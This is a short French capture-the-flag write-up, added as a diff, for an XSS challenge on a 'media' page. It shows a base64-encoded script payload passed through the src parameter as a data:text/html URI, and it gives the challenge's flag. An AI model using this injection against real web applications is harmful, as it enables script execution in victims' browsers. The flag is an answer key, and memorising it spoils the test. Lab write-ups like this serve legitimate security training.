@@ -1,0 +1,11 @@
+Lorsque l'on arrive sur la page media on voit qu'il y a une requête GET effectuée pour récupérer l'image avec la source dans l'url
+
+On regarde les réponses dans le leader et : Content-type: text/html signifie que la requête accepte le type html en contenu de la requête
+
+On injecte du code html dans la requête (en base 64) -->
+
+PHNjcmlwdD5hbGVydCgnR2l2ZSBtZSB0aGUgZmxhZycpPC9zY3JpcHQ -> <script>alert('Give me the flag')</script>
+
+?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgnR2l2ZSBtZSB0aGUgZmxhZycpPC9zY3JpcHQ
+
+flag : 928D819FC19405AE09921A2B71227BD9ABA106F9D2D37AC412E9E5A750F1506D
